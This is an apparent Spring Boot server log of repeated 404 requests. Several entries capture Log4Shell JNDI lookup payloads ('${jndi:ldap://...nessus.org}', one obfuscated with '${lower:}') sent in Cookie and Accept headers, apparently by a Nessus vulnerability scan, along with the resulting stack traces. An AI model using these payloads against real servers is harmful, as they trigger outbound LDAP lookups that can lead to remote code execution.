2024-08-13 21:07:38,203 DEBUG [http-nio-9999-exec-5] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:07:38,207 DEBUG [http-nio-9999-exec-5] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:07:38,207 INFO [http-nio-9999-exec-5] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:38,207 INFO [http-nio-9999-exec-5] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:07:38,209 INFO [http-nio-9999-exec-5] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:38,209 DEBUG [http-nio-9999-exec-5] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:07:38,209 DEBUG [http-nio-9999-exec-5] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:07:38,209 DEBUG [http-nio-9999-exec-5] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:07:38,210 INFO [http-nio-9999-exec-5] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:38,210 INFO [http-nio-9999-exec-5] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:07:38,210 INFO [http-nio-9999-exec-5] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:38,210 DEBUG [http-nio-9999-exec-5] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:07:38,216 DEBUG [http-nio-9999-exec-10] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:07:38,217 DEBUG [http-nio-9999-exec-10] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:07:38,217 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:38,217 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:07:38,226 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:38,226 DEBUG [http-nio-9999-exec-10] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:07:38,226 DEBUG [http-nio-9999-exec-10] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:07:38,227 DEBUG [http-nio-9999-exec-10] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:07:38,227 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:38,227 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:07:38,227 INFO [http-nio-9999-exec-10] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:38,227 DEBUG [http-nio-9999-exec-10] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:07:45,979 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:07:45,980 DEBUG [http-nio-9999-exec-9] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:07:45,980 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:45,980 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:07:45,980 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:45,980 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:07:45,980 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:07:45,981 DEBUG [http-nio-9999-exec-9] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:07:45,981 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:45,981 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:07:45,981 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:45,981 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:07:45,992 INFO [http-nio-9999-exec-6] o.a.t.u.h.p.Cookie [DirectJDKLog.java:173] 
A cookie header was received [${jndi:ldap://log4shell-generic-mh0HQVpBlTtNcWgt32W5${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-mh0HQVpBlTtNcWgt32W5${lower:ten}.w.nessus.org/nessus};] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
2024-08-13 21:07:45,992 DEBUG [http-nio-9999-exec-6] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:07:45,995 WARN [http-nio-9999-exec-6] o.s.b.a.w.s.WelcomePageHandlerMapping [WelcomePageHandlerMapping.java:88] 
Received invalid Accept header. Assuming all media types are accepted
org.springframework.http.InvalidMediaTypeException: Invalid mime type "${jndi:ldap://log4shell-generic-mh0HQVpBlTtNcWgt32W5${lower:ten}.w.nessus.org/nessus}": Invalid token character '{' in token "${jndi:ldap:"
	at org.springframework.http.MediaType.parseMediaType(MediaType.java:742)
	at org.springframework.http.MediaType.parseMediaTypes(MediaType.java:768)
	at org.springframework.boot.autoconfigure.web.servlet.WelcomePageHandlerMapping.getAcceptedMediaTypes(WelcomePageHandlerMapping.java:85)
	at org.springframework.boot.autoconfigure.web.servlet.WelcomePageHandlerMapping.isHtmlTextAccepted(WelcomePageHandlerMapping.java:73)
	at org.springframework.boot.autoconfigure.web.servlet.WelcomePageHandlerMapping.getHandlerInternal(WelcomePageHandlerMapping.java:69)
	at org.springframework.web.servlet.handler.AbstractHandlerMapping.getHandler(AbstractHandlerMapping.java:507)
	at org.springframework.web.servlet.DispatcherServlet.getHandler(DispatcherServlet.java:1283)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1065)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014)
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903)
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885)
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:195)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:164)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:164)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:164)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:164)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:483)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:344)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:389)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:904)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1741)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1190)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
	at java.base/java.lang.Thread.run(Thread.java:833)
Caused by: org.springframework.util.InvalidMimeTypeException: Invalid mime type "${jndi:ldap://log4shell-generic-mh0HQVpBlTtNcWgt32W5${lower:ten}.w.nessus.org/nessus}": Invalid token character '{' in token "${jndi:ldap:"
	at org.springframework.util.MimeTypeUtils.parseMimeTypeInternal(MimeTypeUtils.java:279)
	at org.springframework.util.ConcurrentLruCache.get(ConcurrentLruCache.java:103)
	at org.springframework.util.MimeTypeUtils.parseMimeType(MimeTypeUtils.java:213)
	at org.springframework.http.MediaType.parseMediaType(MediaType.java:739)
	... 46 common frames omitted
2024-08-13 21:07:45,998 DEBUG [http-nio-9999-exec-6] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:07:45,998 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:45,998 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:07:45,998 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:45,999 DEBUG [http-nio-9999-exec-6] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:07:45,999 DEBUG [http-nio-9999-exec-6] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:07:45,999 DEBUG [http-nio-9999-exec-6] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:07:45,999 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:46,000 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:07:46,000 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:46,000 DEBUG [http-nio-9999-exec-6] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:07:51,229 DEBUG [http-nio-9999-exec-4] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:07:51,230 DEBUG [http-nio-9999-exec-4] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:07:51,230 INFO [http-nio-9999-exec-4] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:51,230 INFO [http-nio-9999-exec-4] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:07:51,231 INFO [http-nio-9999-exec-4] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:51,231 DEBUG [http-nio-9999-exec-4] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:07:51,231 DEBUG [http-nio-9999-exec-4] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:07:51,231 DEBUG [http-nio-9999-exec-4] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:07:51,232 INFO [http-nio-9999-exec-4] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:07:51,232 INFO [http-nio-9999-exec-4] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:07:51,232 INFO [http-nio-9999-exec-4] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:07:51,232 DEBUG [http-nio-9999-exec-4] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:08:04,900 DEBUG [http-nio-9999-exec-2] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:08:04,900 DEBUG [http-nio-9999-exec-2] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:08:04,900 INFO [http-nio-9999-exec-2] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:04,901 INFO [http-nio-9999-exec-2] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:08:04,901 INFO [http-nio-9999-exec-2] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:04,901 DEBUG [http-nio-9999-exec-2] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:08:04,901 DEBUG [http-nio-9999-exec-2] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:08:04,902 DEBUG [http-nio-9999-exec-2] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:08:04,902 INFO [http-nio-9999-exec-2] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:04,902 INFO [http-nio-9999-exec-2] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:08:04,902 INFO [http-nio-9999-exec-2] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:04,902 DEBUG [http-nio-9999-exec-2] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:08:04,904 DEBUG [http-nio-9999-exec-7] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:08:04,906 WARN [http-nio-9999-exec-7] o.s.b.a.w.s.WelcomePageHandlerMapping [WelcomePageHandlerMapping.java:88] 
Received invalid Accept header. Assuming all media types are accepted
org.springframework.http.InvalidMediaTypeException: Invalid mime type "${jndi:ldap://127.0.0.1#log4shell-generic-zpC1ErKSxTwFQ11V1NF3.w.nessus.org/nessus}": Invalid token character '{' in token "${jndi:ldap:"
	at org.springframework.http.MediaType.parseMediaType(MediaType.java:742)
	at org.springframework.http.MediaType.parseMediaTypes(MediaType.java:768)
	at org.springframework.boot.autoconfigure.web.servlet.WelcomePageHandlerMapping.getAcceptedMediaTypes(WelcomePageHandlerMapping.java:85)
	at org.springframework.boot.autoconfigure.web.servlet.WelcomePageHandlerMapping.isHtmlTextAccepted(WelcomePageHandlerMapping.java:73)
	at org.springframework.boot.autoconfigure.web.servlet.WelcomePageHandlerMapping.getHandlerInternal(WelcomePageHandlerMapping.java:69)
	at org.springframework.web.servlet.handler.AbstractHandlerMapping.getHandler(AbstractHandlerMapping.java:507)
	at org.springframework.web.servlet.DispatcherServlet.getHandler(DispatcherServlet.java:1283)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1065)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014)
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903)
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885)
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:195)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:164)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:164)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:164)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:164)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:140)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:483)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:344)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:389)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:904)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1741)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1190)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
	at java.base/java.lang.Thread.run(Thread.java:833)
Caused by: org.springframework.util.InvalidMimeTypeException: Invalid mime type "${jndi:ldap://127.0.0.1#log4shell-generic-zpC1ErKSxTwFQ11V1NF3.w.nessus.org/nessus}": Invalid token character '{' in token "${jndi:ldap:"
	at org.springframework.util.MimeTypeUtils.parseMimeTypeInternal(MimeTypeUtils.java:279)
	at org.springframework.util.ConcurrentLruCache.get(ConcurrentLruCache.java:103)
	at org.springframework.util.MimeTypeUtils.parseMimeType(MimeTypeUtils.java:213)
	at org.springframework.http.MediaType.parseMediaType(MediaType.java:739)
	... 46 common frames omitted
2024-08-13 21:08:04,909 DEBUG [http-nio-9999-exec-7] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:08:04,910 INFO [http-nio-9999-exec-7] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:04,910 INFO [http-nio-9999-exec-7] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:08:04,910 INFO [http-nio-9999-exec-7] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:04,910 DEBUG [http-nio-9999-exec-7] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:08:04,910 DEBUG [http-nio-9999-exec-7] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:08:04,911 DEBUG [http-nio-9999-exec-7] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:08:04,911 INFO [http-nio-9999-exec-7] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:04,911 INFO [http-nio-9999-exec-7] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:08:04,911 INFO [http-nio-9999-exec-7] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:04,911 DEBUG [http-nio-9999-exec-7] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:08:08,462 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
POST "/", parameters={}
2024-08-13 21:08:08,462 DEBUG [http-nio-9999-exec-9] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:08:08,463 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:08,463 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:558] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:08:08,463 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:574] 
Invalid URL sent by requestId null
2024-08-13 21:08:08,464 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:08:08,464 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for POST "/error", parameters={}
2024-08-13 21:08:08,464 DEBUG [http-nio-9999-exec-9] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:08:08,464 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:08,464 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:558] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:08:08,464 INFO [http-nio-9999-exec-9] c.d.a.i.BaseInterceptor [BaseInterceptor.java:574] 
Invalid URL sent by requestId null
2024-08-13 21:08:08,464 DEBUG [http-nio-9999-exec-9] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1135] 
Exiting from "ERROR" dispatch, status 404
2024-08-13 21:08:15,122 DEBUG [http-nio-9999-exec-6] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
GET "/", parameters={}
2024-08-13 21:08:15,122 DEBUG [http-nio-9999-exec-6] o.s.w.s.h.SimpleUrlHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]
2024-08-13 21:08:15,122 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:15,123 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /
2024-08-13 21:08:15,123 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
2024-08-13 21:08:15,123 DEBUG [http-nio-9999-exec-6] o.s.w.s.DispatcherServlet [FrameworkServlet.java:1138] 
Completed 404 NOT_FOUND
2024-08-13 21:08:15,123 DEBUG [http-nio-9999-exec-6] o.s.w.s.DispatcherServlet [LogFormatUtils.java:120] 
"ERROR" dispatch for GET "/error", parameters={}
2024-08-13 21:08:15,123 DEBUG [http-nio-9999-exec-6] o.s.w.s.m.m.a.RequestMappingHandlerMapping [AbstractHandlerMapping.java:531] 
Mapped to org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)
2024-08-13 21:08:15,123 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:53] 
Inside prehandle
2024-08-13 21:08:15,124 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:233] 
############Request Processing started for request-id null and esbURL is /error
2024-08-13 21:08:15,124 INFO [http-nio-9999-exec-6] c.d.a.i.BaseInterceptor [BaseInterceptor.java:249] 
Invalid URL sent by requestId null
